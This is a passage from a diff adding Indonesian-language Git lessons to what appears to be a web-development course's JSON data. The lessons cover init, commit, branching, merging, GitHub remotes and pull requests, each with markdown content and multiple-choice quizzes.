+            "definition": "File teks konfigurasi yang berisi daftar file dan folder yang harus diabaikan oleh Git."
+          }
+        ],
+        "contentMd": "# Dasar Git: init, add, commit, status & log\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari sistem kontrol versi paling populer di dunia: **Git**. Anda akan memahami 3 zona kerja Git (**Working Directory $\\rightarrow$ Staging Area $\\rightarrow$ Repository**), membuat riwayat perubahan dengan **`git commit`**, memeriksa kondisi dengan **`git status`**, dan mengabaikan file dengan **`.gitignore`**.\n\n## Mengapa Konsep Ini Penting?\nTanpa Git, developer sering menduplikat folder seperti `proyek-final`, `proyek-final-banget`, `proyek-final-revisi-3`. Pendekatan manual ini sangat kacau dan rentan kehilangan kode. Git menyediakan riwayat perjalanan waktu (*time-travel*) yang aman dan terorganisir untuk setiap baris kode Anda.\n\n## 1. Tiga Zona Kerja Git\nGit mengelola file Anda melalui 3 tahapan siklus hidup:\n\n```text\n[ Working Directory ]  ---> git add --->  [ Staging Area ]  ---> git commit --->  [ Git Repository ]\n(File yang Anda edit)                    (Area Persiapan)                         (Snapshot Permanen)\n```\n\n1. **Working Directory**: Folder lokal tempat Anda menulis dan mengubah file kode.\n2. **Staging Area (`git add`)**: Keranjang persiapan tempat Anda memilih secara selektif perubahan file mana saja yang ingin disimpan.\n3. **Repository (`git commit`)**: Database lokal Git di dalam folder tersembunyi `.git` yang menyimpan snapshot permanen kode Anda.\n\n## 2. Alur Perintah Dasar Git Langkah demi Langkah\n\n### Langkah 1: Menginisialisasi Proyek Baru\n```bash\n# Jalankan di dalam folder proyek Anda\ngit init\n```\n\n### Langkah 2: Memeriksa Status File\n```bash\ngit status\n# Menampilkan file mana yang baru diubah (merah) atau sudah di-stage (hijau)\n```\n\n### Langkah 3: Menambahkan Perubahan ke Staging Area\n```bash\n# Menambahkan 1 file spesifik\ngit add index.html\n\n# Atau menambahkan seluruh perubahan di folder saat ini\ngit add .\n```\n\n### Langkah 4: Menyimpan Snapshot dengan Commit\n```bash\ngit commit -m \"feat(home): add hero section and navigation\"\n```\n\n### Langkah 5: Melihat Riwayat Perjalanan Waktu\n```bash\ngit log --oneline\n# Menampilkan daftar commit ringkas dengan ID hash dan pesan commit\n```\n\n## 3. Mengabaikan File dengan `.gitignore`\nFile rahasia seperti password (`.env`), cache sistem (`.DS_Store`), atau dependensi raksasa (`node_modules/`) **TIDAK BOLEH** masuk ke dalam Git. Buat file bernama `.gitignore` di root proyek:\n\n```text\n# File .gitignore\nnode_modules/\n.env\n.env.local\n.next/\ndist/\n```\n\n## Kesalahan Umum Pemula\n- **Lupa menambahkan file ke staging sebelum commit**: Menjalankan `git commit` tanpa `git add` akan menghasilkan pesan *\"nothing to commit\"*.\n- **Menulis commit message tidak deskriptif**: Pesan seperti `git commit -m \"asdasd\"` menyulitkan Anda menelusuri bug di kemudian hari.\n\n## Praktik Mandiri\n1. Buka terminal pada folder latihan Anda, jalankan `git init`.\n2. Buat file `index.html` dan file `.gitignore`.\n3. Jalankan `git add .`, lalu buat commit pertama Anda: `git commit -m \"chore: initial project setup\"`.\n4. Periksa riwayatnya dengan mengetikkan `git log`.\n\n## Ringkasan\n- **`git init`** mengubah folder biasa menjadi repository Git lokal.\n- Siklus perubahan: Edit di **Working Directory** $\\rightarrow$ siapkan dengan **`git add`** $\\rightarrow$ simpan permanen dengan **`git commit`**.\n- **`git status`** memeriksa status file, dan **`git log`** melihat riwayat commit.\n- Gunakan **`.gitignore`** untuk mencegah file sensitif dan dependensi besar ter-commit.",
+        "quizzes": [
+          {
+            "id": "q-6-1-1",
+            "question": "Perintah Git manakah yang digunakan untuk menginisialisasi folder proyek lokal menjadi repository Git baru?",
+            "options": [
+              "git init",
+              "git start",
+              "git create-repo",
+              "git new"
+            ],
+            "correctIndex": 0,
+            "explanation": "git init membuat direktori tersembunyi .git untuk mulai melacak riwayat versi perubahan file di dalam proyek."
+          },
+          {
+            "id": "q-6-1-2",
+            "question": "Apa fungsi dari 'Staging Area' (git add) dalam siklus hidup perubahan file di Git?",
+            "options": [
+              "Sebagai area persiapan untuk memilih secara selektif perubahan file mana saja yang ingin dibungkus ke dalam snapshot commit berikutnya.",
+              "Untuk mengunggah kode langsung ke server publik GitHub.",
+              "Untuk menghapus riwayat bug secara permanen.",
+              "Untuk menginstal paket dependensi npm."
+            ],
+            "correctIndex": 0,
+            "explanation": "Staging area memberi fleksibilitas bagi developer untuk meninjau dan mengelompokkan perubahan file sebelum disimpan permanen sebagai commit."
+          },
+          {
+            "id": "q-6-1-3",
+            "question": "Apa risiko fatal jika file sensitif seperti .env yang berisi password database tidak didaftarkan di dalam file .gitignore?",
+            "options": [
+              "File .env akan ikut ter-commit dan dapat terunggah ke repository publik GitHub sehingga kredensial server Anda terekspos ke publik.",
+              "Git akan menolak menjalankan perintah commit sama sekali.",
+              "Database PostgreSQL akan terhapus otomatis.",
+              "Browser pengguna tidak akan bisa membuka website."
+            ],
+            "correctIndex": 0,
+            "explanation": "File .gitignore bertugas mencegah file kredensial rahasia, cache build, dan folder node_modules agar tidak masuk ke version control."
+          }
+        ]
+      },
+      {
+        "id": "lesson-6-2",
+        "stageId": "stage-6",
+        "slug": "branching-strategy-dan-isolasi-fitur",
+        "title": "Branching Strategy & Isolasi Fitur",
+        "titleEn": "Branching Strategy & Feature Isolation",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Membuat branch baru (git branch, git switch), konvensi penamaan (feature/, bugfix/), dan mengisolasi pekerjaan agar branch main tetap stabil.",
+        "prerequisites": [
+          "dasar-git-init-add-commit-status"
+        ],
+        "learningObjectives": [
+          "Menjelaskan konsep Branch (cabang) dalam isolasi pengembangan fitur secara paralel.",
+          "Mengeksekusi perintah pembuatan dan perpindahan branch modern (git switch -c / git checkout -b).",
+          "Menerapkan konvensi penamaan branch profesional (feature/, bugfix/, hotfix/).",
+          "Memeriksa daftar branch lokal dengan git branch."
+        ],
+        "whyMatters": "Mengembangkan fitur langsung di branch `main` berisiko merilis kode yang belum selesai atau memiliki bug fatal ke pengguna produksi.",
+        "careerContext": "Semua tim engineering bekerja menggunakan Feature Branch Workflow untuk memisahkan tugas antar developer.",
+        "commonMistakes": [
+          "Bekerja dan melakukan commit langsung di branch `main` tanpa membuat branch fitur terpisah.",
+          "Lupa berpindah ke branch baru sebelum mulai mengetik kode baru."
+        ],
+        "keyTerms": [
+          {
+            "term": "Branch",
+            "definition": "Jalur garis waktu independen yang bercabang dari branch utama untuk mengembangkan fitur secara terisolasi."
+          },
+          {
+            "term": "main / master",
+            "definition": "Branch utama yang merepresentasikan kode stabil yang siap dirilis ke lingkungan produksi."
+          },
+          {
+            "term": "git switch",
+            "definition": "Perintah modern Git untuk berpindah antar branch atau membuat branch baru dengan opsi `-c`."
+          }
+        ],
+        "contentMd": "# Branching Strategy & Isolasi Fitur\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari konsep **Branching (Percabangan)** di Git: bagaimana membuat jalur kerja terisolasi untuk fitur baru (**`git switch -c`** / **`git checkout -b`**), konvensi penamaan branch standar industri, serta menjaga agar branch utama (`main`) selalu stabil dan siap rilis.\n\n## Mengapa Konsep Ini Penting?\nBayangkan Anda sedang memperbaiki fitur Login yang membutuhkan waktu 3 hari. Di saat bersamaan, ada bug darurat pada halaman pembayaran yang harus diperbaiki dalam 10 menit. Jika Anda bekerja di satu jalur yang sama (`main`), kode login Anda yang belum selesai akan ikut ter-deploy dan merusak aplikasi. Branching memecahkan masalah ini dengan menyediakan jalur kerja paralel.\n\n## 1. Konsep Branch: Garis Waktu Paralel\nSecara default, repository Git dimulai dengan satu branch utama bernama **`main`** (atau `master` pada proyek lawas).\n- **Branch `main`**: Hanya berisi kode stabil yang sudah diuji dan siap dirilis ke pengguna (*Production-Ready*).\n- **Feature Branch**: Garis waktu cabang tempat Anda bereksperimen, menulis fitur baru, atau memperbaiki bug secara bebas tanpa takut merusak branch `main`.\n\n## 2. Perintah Branching Git Modern\n\n```bash\n# 1. Melihat daftar seluruh branch yang ada di lokal\ngit branch\n# Tanda bintang (*) berwarna hijau menandakan branch yang sedang aktif\n\n# 2. Membuat branch baru DAN langsung berpindah ke branch tersebut (Cara Modern)\ngit switch -c feature/login-google\n# Atau sintaks klasik: git checkout -b feature/login-google\n\n# 3. Berpindah kembali ke branch main\ngit switch main\n# Atau sintaks klasik: git checkout main\n\n# 4. Menghapus branch yang sudah tidak dipakai\ngit branch -d feature/login-google\n```\n\n## 3. Konvensi Penamaan Branch Profesional\nGunakan struktur ber-kategori (*prefix*) agar seluruh tim memahami tujuan dari branch tersebut:\n- **`feature/nama-fitur`**: Untuk pengembangan fitur baru (contoh: `feature/dark-mode`, `feature/cart-checkout`).\n- **`fix/nama-bug`** atau **`bugfix/...`**: Untuk perbaikan bug reguler (contoh: `fix/navbar-overflow`).\n- **`hotfix/...`**: Untuk perbaikan bug kritis darurat langsung di server produksi.\n- **`refactor/...`**: Untuk restrukturisasi kode tanpa mengubah fungsionalitas visual.\n\n## Kesalahan Umum Pemula\n- **Langsung coding tanpa memeriksa branch aktif**: Menulis kode fitur baru di branch `main` secara tidak sengaja. Selalu jalankan `git status` atau `git branch` sebelum mulai bekerja.\n\n## Praktik Mandiri\n1. Buat branch baru bernama `feature/halaman-profil` menggunakan perintah `git switch -c feature/halaman-profil`.\n2. Buat file `profil.html`, tambahkan ke staging, dan lakukan commit.\n3. Berpindah kembali ke branch `main` dengan `git switch main`, lalu perhatikan bahwa file `profil.html` tidak ada di branch `main` karena terisolasi di branch fitur Anda.\n\n## Ringkasan\n- **Branching** mengisolasi pekerjaan fitur baru agar branch **`main`** tetap bersih dan stabil.\n- Gunakan **`git switch -c nama-branch`** untuk membuat dan langsung berpindah ke branch baru.\n- Terapkan konvensi penamaan seperti **`feature/`** dan **`fix/`**.",
+        "quizzes": [
+          {
+            "id": "q-6-2-1",
+            "question": "Mengapa para developer profesional selalu membuat branch baru (misal: feature/login) saat mengembangkan fitur baru, bukan langsung menulis di branch main?",
+            "options": [
+              "Untuk mengisolasi pengembangan fitur agar kode yang belum selesai atau sedang diuji tidak merusak branch main yang siap rilis ke production.",
+              "Karena branch main tidak bisa menyimpan lebih dari 10 file kode.",
+              "Agar file kode otomatis terenkripsi oleh server Git.",
+              "Karena branch main membatasi jumlah baris kode yang boleh ditulis."
+            ],
+            "correctIndex": 0,
+            "explanation": "Branching memungkinkan isolasi fitur, eksperimentasi aman, dan kolaborasi paralel antar banyak developer tanpa saling mengganggu stabilitas branch utama."
+          },
+          {
+            "id": "q-6-2-2",
+            "question": "Perintah Git modern manakah yang paling ringkas untuk membuat branch baru sekaligus langsung berpindah ke branch tersebut?",
+            "options": [
+              "git switch -c feature/navbar atau git checkout -b feature/navbar",
+              "git branch --create-and-jump feature/navbar",
+              "git new branch feature/navbar",
+              "git go feature/navbar"
+            ],
+            "correctIndex": 0,
+            "explanation": "git switch -c <nama> (atau git checkout -b <nama>) adalah perintah standar industri untuk membuat dan berpindah branch dalam satu langkah."
+          },
+          {
+            "id": "q-6-2-3",
+            "question": "Bagaimana cara melihat daftar seluruh branch lokal yang ada di repository Anda beserta penanda branch yang sedang aktif saat ini?",
+            "options": [
+              "git branch",
+              "git status --all-branches",
+              "git list-tree",
+              "git show-repo"
+            ],
+            "correctIndex": 0,
+            "explanation": "git branch menampilkan daftar seluruh branch lokal dengan tanda bintang (*) berwarna hijau pada branch yang sedang aktif di-checkout."
+          }
+        ]
+      },
+      {
+        "id": "lesson-6-3",
+        "stageId": "stage-6",
+        "slug": "merge-rebase-dan-merge-conflicts",
+        "title": "Merge, Rebase & Resolusi Merge Conflicts",
+        "titleEn": "Merge, Rebase & Merge Conflict Resolution",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Menggabungkan branch dengan git merge, memahami perbedaan git rebase, dan menyelesaikan bentrokan kode (Merge Conflicts) secara percaya diri.",
+        "prerequisites": [
+          "branching-strategy-dan-isolasi-fitur"
+        ],
+        "learningObjectives": [
+          "Menggabungkan branch fitur ke branch utama menggunakan perintah git merge.",
+          "Membedakan alur riwayat commit antara git merge (merge commit) dan git rebase (linear history).",
+          "Mendiagnosis penyebab terjadinya Merge Conflict (dua cabang mengubah baris yang sama).",
+          "Menyelesaikan marker konflik (<<<<<<<, =======, >>>>>>>) dan merampungkan proses merge."
+        ],
+        "whyMatters": "Merge conflict adalah hal wajar dalam kerja tim kolaboratif; developer yang handal tahu cara membaca dan menyelesaikannya tanpa panik.",
+        "careerContext": "Kemampuan menyelesaikan konflik kode secara bersih dinilai tinggi dalam proses onboarding developer di perusahaan skala besar.",
+        "commonMistakes": [
+          "Panik saat melihat marker konflik dan menghapus folder `.git` (yang akan menghilangkan seluruh riwayat commit proyek).",
+          "Melakukan `git rebase` pada branch publik yang sedang digunakan bersama oleh developer lain."
+        ],
+        "keyTerms": [
+          {
+            "term": "git merge",
+            "definition": "Perintah untuk menggabungkan riwayat commit dari satu branch ke branch aktif saat ini."
+          },
+          {
+            "term": "git rebase",
+            "definition": "Memindahkan titik basis sebuah branch ke ujung commit branch lain untuk menghasilkan riwayat yang lurus linear."
+          },
+          {
+            "term": "Merge Conflict",
+            "definition": "Kondisi di mana Git tidak dapat menggabungkan file otomatis karena adanya perubahan bertentangan pada baris kode yang sama."
+          },
+          {
+            "term": "Conflict Markers",
+            "definition": "Penanda teks yang disisipkan Git (`<<<<<<< HEAD`, `=======`, `>>>>>>>`) untuk menunjukkan letak perbedaan kode."
+          }
+        ],
+        "contentMd": "# Merge, Rebase & Resolusi Merge Conflicts\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara menyatukan kembali cabang fitur ke branch utama menggunakan **`git merge`**, memahami perbedaan dengan **`git rebase`**, serta langkah demi langkah menyelesaikan konflik bentrokan kode (**Merge Conflicts**).\n\n## Mengapa Konsep Ini Penting?\nKetika dua developer mengedit baris kode yang sama pada file yang sama dan mencoba menggabungkannya, Git tidak bisa menebak kode siapa yang harus dipertahankan. Git meminta bantuan manusia untuk membuat keputusan. Menyelesaikan konflik adalah keahlian wajib setiap developer tim.\n\n## 1. Menggabungkan Branch dengan `git merge`\nSetelah fitur di branch `feature/navbar` selesai dan diuji, satukan kembali ke `main`:\n\n```bash\n# 1. Pindah ke branch tujuan (main)\ngit switch main\n\n# 2. Tarik dan gabungkan perubahan dari branch fitur\ngit merge feature/navbar\n```\n\n## 2. Perbedaan `git merge` vs `git rebase`\n- **`git merge`**: Membuat sebuah commit penggabungan baru (*Merge Commit*) dan mempertahankan cabang historis apa adanya (bagus untuk melihat jejak sejarah lengkap).\n- **`git rebase`**: Menulis ulang riwayat dengan memindahkan titik pangkal branch fitur ke ujung commit terbaru branch main, menghasilkan riwayat commit yang lurus satu garis (*linear history*).\n\n> **Aturan Emas Rebase**: Jangan pernah melakukan rebase pada branch publik yang sedang diakses bersama oleh anggota tim lain!\n\n## 3. Anatomi dan Cara Menyelesaikan Merge Conflict\nJika terjadi konflik, Git akan menjeda proses merge dan menandai file yang bermasalah dengan **Conflict Markers**:\n\n```html\n<<<<<<< HEAD (Kode di Branch Main saat ini)\n<button class=\"btn-biru\">Masuk Akun</button>\n=======\n<button class=\"btn-hijau\">Login Pengguna</button>\n>>>>>>> feature/navbar (Kode dari Branch yang ingin digabung)\n```\n\n### 3 Langkah Menyelesaikan Konflik:\n1. **Pilih Kode yang Benar**: Buka file di VS Code, diskusikan dengan rekan tim, lalu pilih kode mana yang ingin dipertahankan (atau gabungkan keduanya).\n2. **Hapus Seluruh Marker Konflik**: Hapus tanda `<<<<<<<`, `=======`, dan `>>>>>>>` sampai file bersih.\n3. **Tandai Selesai & Commit**:\n```bash\ngit add index.html\ngit commit -m \"chore: resolve merge conflict in navbar button\"\n```\n\n## Kesalahan Umum Pemula\n- **Menghapus folder `.git` saat panik**: Jika Anda ingin membatalkan proses merge yang sedang berkonflik tanpa kehilangan kode, cukup jalankan perintah aman: `git merge --abort`.\n\n## Praktik Mandiri\n1. Buat branch baru, ubah teks judul di `index.html`, dan lakukan commit.\n2. Kembali ke `main`, ubah baris teks judul yang sama dengan kata berbeda, dan lakukan commit.\n3. Coba jalankan `git merge` untuk memicu konflik sengaja, lalu selesaikan konfliknya menggunakan editor VS Code Anda.\n\n## Ringkasan\n- **`git merge`** menyatukan perubahan dari branch fitur ke branch utama.\n- **Merge Conflict** terjadi saat dua branch memodifikasi baris kode yang sama dengan isi berbeda.\n- Selesaikan konflik dengan memilih kode yang tepat, menghapus marker konflik, lalu lakukan **`git add`** dan **`git commit`**.\n- Gunakan **`git merge --abort`** jika ingin membatalkan proses merge yang sedang berkonflik.",
+        "quizzes": [
+          {
+            "id": "q-6-3-1",
+            "question": "Kapan kondisi 'Merge Conflict' terjadi di dalam Git?",
+            "options": [
+              "Ketika dua branch yang berbeda memodifikasi baris kode yang sama pada file yang sama dengan isi berbeda, sehingga Git membutuhkan keputusan manual manusia untuk memilih kode mana yang benar.",
+              "Ketika kapasitas harddisk komputer lokal telah penuh.",
+              "Ketika pesan commit message melebihi 100 karakter.",
+              "Ketika file HTML tidak memiliki tag penutup body."
+            ],
+            "correctIndex": 0,
+            "explanation": "Merge conflict terjadi saat Git tidak dapat menggabungkan perubahan secara otomatis karena adanya modifikasi yang saling bertentangan pada baris yang sama."
+          },
+          {
+            "id": "q-6-3-2",
+            "question": "Apa perbedaan alur riwayat commit antara git merge dan git rebase?",
+            "options": [
+              "git merge membuat commit penggabungan (merge commit) baru dan mempertahankan jejak cabang historis, sedangkan git rebase memindahkan basis branch menghasilkan riwayat commit yang lurus linear.",
+              "git rebase menghapus seluruh kode lama secara permanen.",
+              "git merge hanya bisa digunakan untuk file CSS.",
+              "Keduanya identik dan tidak memiliki perbedaan pada riwayat commit."
+            ],
+            "correctIndex": 0,
+            "explanation": "rebase menulis ulang riwayat commit agar sejajar linear, sementara merge mempertahankan jejak historis percabangan dengan merge commit."
+          },
+          {
+            "id": "q-6-3-3",
+            "question": "Setelah Anda selesai mengedit dan memilih kode yang benar saat terjadi merge conflict, langkah apakah yang harus dilakukan untuk menyelesaikan proses merge?",
+            "options": [
+              "Jalankan git add <file> untuk menandai konflik telah diselesaikan, lalu lakukan git commit.",
+              "Hapus folder tersembunyi .git dari komputer.",
+              "Jalankan perintah git delete-conflict.",
+              "Tutup aplikasi VS Code tanpa menyimpan perubahan."
+            ],
+            "correctIndex": 0,
+            "explanation": "Setelah menghapus marker konflik, lakukan git add pada file yang telah diperbaiki lalu buat commit untuk merampungkan proses merge."
+          }
+        ]
+      },
+      {
+        "id": "lesson-6-4",
+        "stageId": "stage-6",
+        "slug": "github-remote-push-pull-dan-clone",
+        "title": "GitHub Remote, Push, Pull & Clone",
+        "titleEn": "GitHub Remote: Push, Pull & Clone",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Menghubungkan repository lokal ke GitHub remote (git remote add origin), mengunggah kode (git push), mengambil pembaruan (git pull), dan mengunduh repo (git clone).",
+        "prerequisites": [
+          "merge-rebase-dan-merge-conflicts"
+        ],
+        "learningObjectives": [
+          "Membedakan antara Git (alat lokal) dan GitHub (platform hosting cloud).",
+          "Menghubungkan repository lokal ke GitHub menggunakan git remote add origin.",
+          "Mengunggah snapshot commit ke cloud dengan git push.",
+          "Menyinkronkan perubahan terbaru dari rekan tim menggunakan git pull dan menyalin proyek dengan git clone."
+        ],
+        "whyMatters": "GitHub adalah platform kolaborasi nomor satu di dunia tempat developer menyimpan portofolio publik, berkontribusi ke open source, dan bekerja bersama tim.",
+        "careerContext": "Link profil GitHub adalah resume/CV digital paling autentik bagi seorang web developer modern.",
+        "commonMistakes": [
+          "Mencoba melakukan `git push` saat repository remote memiliki commit baru yang belum ditarik ke lokal (harus `git pull` terlebih dahulu).",
+          "Mengira Git dan GitHub adalah perusahaan dan produk yang sama persis."
+        ],
+        "keyTerms": [
+          {
+            "term": "Remote Repository",
+            "definition": "Salinan repository yang disimpan di server cloud (seperti GitHub) untuk kolaborasi dan backup."
+          },
+          {
+            "term": "origin",
+            "definition": "Nama alias standar bawaan untuk URL remote repository utama."
+          },
+          {
+            "term": "git push",
+            "definition": "Perintah untuk mengunggah commit lokal ke remote repository di GitHub."
+          },
+          {
+            "term": "git pull",
+            "definition": "Perintah untuk mengunduh dan menggabungkan commit terbaru dari GitHub ke repository lokal."
+          },
+          {
+            "term": "git clone",
+            "definition": "Perintah untuk menyalin seluruh repository dari GitHub ke komputer lokal untuk pertama kali."
+          }
+        ],
+        "contentMd": "# GitHub Remote, Push, Pull & Clone\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara menghubungkan repository Git lokal di komputer Anda ke platform cloud **GitHub**: menambahkan remote repository (**`git remote`**), mengunggah kode (**`git push`**), menarik pembaruan tim (**`git pull`**), dan menyalin proyek (**`git clone`**).\n\n## Mengapa Konsep Ini Penting?\nJika laptop Anda rusak, semua kode di repository Git lokal akan hilang jika tidak di-backup ke server cloud. GitHub bertindak sebagai pusat penyimpanan cadangan, ruang kolaborasi tim lintas negara, dan portofolio publik karya Anda.\n\n## 1. Perbedaan Mendasar: Git vs GitHub\n- **Git**: Perangkat lunak sistem kontrol versi (*command line tool*) yang berjalan secara lokal di komputer Anda tanpa butuh koneksi internet.\n- **GitHub**: Platform layanan cloud milik Microsoft yang menyediakan hosting untuk repository Git, antarmuka web, *code review*, dan automasi CI/CD.\n\n## 2. Alur Perintah Menghubungkan Lokal ke GitHub\n\n```bash\n# 1. Tautkan repository lokal ke URL GitHub (nama alias standar: origin)\ngit remote add origin https://github.com/username/nama-repo.git\n\n# 2. Verifikasi tautan remote\ngit remote -v\n\n# 3. Unggah seluruh commit lokal ke branch main di GitHub\ngit push -u origin main\n# Opsi -u (upstream) mengingat branch tujuan sehingga selanjutnya cukup mengetik 'git push'\n```\n\n## 3. Berkolaborasi: `git pull` dan `git clone`\n\n### A. Mengunduh Repository yang Sudah Ada (`git clone`)\nJika Anda baru bergabung ke sebuah tim atau ingin membuka proyek di laptop baru:\n```bash\ngit clone https://github.com/username/nama-repo.git\n# Perintah ini otomatis membuat folder baru, mengunduh seluruh file, branch, dan riwayat commit\n```\n\n### B. Mengambil Perubahan Terbaru (`git pull`)\nJika rekan kerja Anda telah melakukan push kode baru ke GitHub, perbarui laptop Anda dengan:\n```bash\ngit pull origin main\n# Mengambil commit baru dari GitHub dan menggabungkannya ke branch lokal Anda\n```\n\n## Kesalahan Umum Pemula\n- **Push Ditolak (*Push Rejected*)**: Terjadi jika ada commit di GitHub yang belum Anda miliki di laptop. Jalankan `git pull origin main` terlebih dahulu, selesaikan jika ada konflik, baru lakukan `git push`.\n\n## Praktik Mandiri\n1. Buat akun di [github.com](https://github.com) jika belum punya.\n2. Buat repository baru di GitHub bernama `latihan-git`.\n3. Ikuti panduan perintah di GitHub untuk melakukan `git remote add origin` dan lakukan `git push` pertama Anda.\n\n## Ringkasan\n- **Git** adalah alat pelacak lokal, sedangkan **GitHub** adalah platform hosting cloud.\n- **`git remote add origin <URL>`** menghubungkan repo lokal ke GitHub.\n- **`git push`** mengunggah commit lokal ke GitHub.\n- **`git pull`** menyinkronkan pembaruan dari GitHub ke lokal.\n- **`git clone`** menyalin repository publik/privat ke komputer lokal untuk pertama kali.",
+        "quizzes": [
+          {
+            "id": "q-6-4-1",
+            "question": "Apa perbedaan antara repository Git lokal pada komputer Anda dan repository remote di GitHub?",
+            "options": [
+              "Repository lokal berada di harddisk komputer Anda, sedangkan repository remote tersimpan di cloud server (GitHub) untuk backup, kolaborasi tim, dan CI/CD.",
+              "Repository GitHub hanya bisa dibuka oleh robot AI.",
+              "Repository lokal tidak bisa menjalankan perintah commit.",
+              "GitHub hanya mendukung bahasa pemrograman Python."
+            ],
+            "correctIndex": 0,
+            "explanation": "Git adalah sistem kontrol versi lokal, sedangkan GitHub adalah platform hosting cloud untuk repository Git yang memfasilitasi kerja tim global."
+          },
+          {
+            "id": "q-6-4-2",
+            "question": "Perintah manakah yang digunakan untuk mengunduh repository yang sudah ada di GitHub ke komputer lokal Anda untuk pertama kalinya?",
+            "options": [
+              "git clone <url-repo>",
+              "git download <url-repo>",
+              "git import <url-repo>",
+              "git copy-cloud <url-repo>"
+            ],
+            "correctIndex": 0,
+            "explanation": "git clone menyalin seluruh riwayat, branch, dan file dari remote repository ke direktori lokal baru di komputer Anda."
+          },
+          {
+            "id": "q-6-4-3",
+            "question": "Jika rekan kerja Anda telah melakukan push fitur baru ke repository GitHub, perintah apa yang harus Anda jalankan di komputer Anda untuk mengambil perubahan terbaru tersebut?",
+            "options": [
+              "git pull origin main",
+              "git push origin main",
+              "git upload-sync",
+              "git refresh-all"
+            ],
+            "correctIndex": 0,
+            "explanation": "git pull mengambil commit terbaru dari remote repository di GitHub dan menggabungkannya ke branch lokal Anda."
+          }
+        ]
+      },
+      {
+        "id": "lesson-6-5",
+        "stageId": "stage-6",
+        "slug": "pull-request-dan-conventional-commits",
+        "title": "Pull Request & Standar Conventional Commits",
+        "titleEn": "Pull Requests & Conventional Commits",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 15,
+        "description": "Melakukan kolaborasi tim dengan Pull Request (PR), proses Code Review, dan standarisasi pesan commit profesional (Conventional Commits).",
+        "prerequisites": [
+          "github-remote-push-pull-dan-clone"
+        ],
+        "learningObjectives": [
+          "Menjelaskan alur kerja Pull Request (PR) dalam kolaborasi tim di GitHub.",
+          "Menerapkan format standar Conventional Commits (feat, fix, docs, refactor, chore).",
+          "Memahami etika dan best practice dalam proses Code Review tim."
+        ],
+        "whyMatters": "Pull Request dan Conventional Commits adalah standar kualitas kerja tim yang memungkinkan pembuatan changelog otomatis dan penelusuran riwayat yang rapi.",
+        "careerContext": "Tech Lead dan Senior Developer menilai kedewasaan engineering seorang kandidat dari cara ia menulis PR dan commit message.",
+        "commonMistakes": [
+          "Membuat Pull Request raksasa berisi 50 file sekaligus yang sangat sulit ditinjau oleh reviewer (buat PR kecil dan fokus per fitur).",
+          "Menulis commit type yang salah, misalnya menandai penambahan fitur baru dengan prefix `fix:`."
+        ],
+        "keyTerms": [
+          {
+            "term": "Pull Request (PR)",
+            "definition": "Mekanisme pengajuan perubahan kode dari sebuah branch fitur ke branch utama yang meminta peninjauan dari rekan tim."
+          },
+          {
+            "term": "Code Review",
+            "definition": "Proses di mana anggota tim membaca, mendiskusikan, dan memeriksa kualitas kode sebelum diizinkan di-merge."
+          },
+          {
+            "term": "Conventional Commits",
+            "definition": "Konvensi standar penulisan pesan commit dengan format `<type>(<scope>): <deskripsi>`."
+          }
+        ],
+        "contentMd": "# Pull Request & Standar Conventional Commits\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari alur kerja kolaborasi profesional di GitHub: membuat **Pull Request (PR)**, melakukan **Code Review**, dan menerapkan format standar industri **Conventional Commits**.\n\n## Mengapa Konsep Ini Penting?\nDi dunia profesional, developer tidak pernah melakukan push langsung ke branch `main`. Setiap perubahan diajukan melalui Pull Request agar anggota tim dapat meninjau kualitas kode, mencari potensi bug tersembunyi, dan memastikan keamanan sistem sebelum kode dilepas ke pengguna.\n\n## 1. Alur Kerja Pull Request (PR Workflow)\n1. **Buat Branch Fitur**: Developer membuat branch lokal `feature/pembayaran`.\n2. **Commit & Push ke GitHub**: `git push origin feature/pembayaran`.\n3. **Buka Pull Request di GitHub**: Mengajukan permintaan agar branch `feature/pembayaran` digabung (*merged*) ke `main`.\n4. **Code Review**: Rekan tim dan Tech Lead meninjau baris kode, memberikan komentar masukan, atau meminta perbaikan (*Request Changes*).\n5. **Automated Testing (CI)**: Robot CI otomatis menjalankan build dan unit test.\n6. **Merge & Deploy**: Setelah disetujui (*Approved*), PR di-merge ke `main` dan fitur otomatis dirilis.\n\n## 2. Standar Format Conventional Commits\nFormat standar industri untuk pesan commit:\n\n```text\n<type>(<scope opsional>): <deskripsi singkat dalam huruf kecil>\n```\n\n### Jenis-Jenis Tipe Commit Utama:\n- **`feat:`**: Menambahkan fitur baru bagi pengguna (contoh: `feat(auth): add google oauth2 login`).\n- **`fix:`**: Memperbaiki bug pada sistem (contoh: `fix(navbar): fix mobile overflow issue`).\n- **`docs:`**: Perubahan dokumentasi saja (contoh: `docs(readme): add installation guide`).\n- **`style:`**: Perubahan format/spasi tanpa mengubah logika kode.\n- **`refactor:`**: Restrukturisasi kode tanpa menambah fitur atau memperbaiki bug.\n- **`test:`**: Menambah atau memperbaiki automated unit test.\n- **`chore:`**: Pembaruan konfigurasi build, dependensi package.json, atau file gitignore.\n\n```bash\n# Contoh Commit Message yang SANGAT BAIK:\ngit commit -m \"feat(cart): implement voucher discount calculation\"\ngit commit -m \"fix(checkout): prevent double submission on slow network\"\n```\n\n## Kesalahan Umum Pemula\n- **Membuat PR 'Monster'**: Menggabungkan 20 fitur berbeda ke dalam 1 PR besar yang memuat 1000 baris perubahan. PR harus kecil, atomik, dan fokus pada satu tanggung jawab.\n\n## Praktik Mandiri\n1. Buat branch fitur baru, lakukan perubahan kecil.\n2. Commit menggunakan format `feat: ...` atau `docs: ...`.\n3. Push ke GitHub dan buka halaman repository Anda untuk membuat Pull Request pertama Anda.\n\n## Ringkasan\n- **Pull Request (PR)** memfasilitasi *Code Review* dan kontrol kualitas sebelum kode digabung ke `main`.\n- **Conventional Commits** menggunakan tipe standar: **`feat:`** (fitur baru), **`fix:`** (perbaikan bug), **`docs:`**, **`refactor:`**, dan **`chore:`**.\n- Format commit yang rapi mempermudah pembuatan catatan rilis (*changelog*) otomatis.",
+        "quizzes": [
+          {
+            "id": "q-6-5-1",
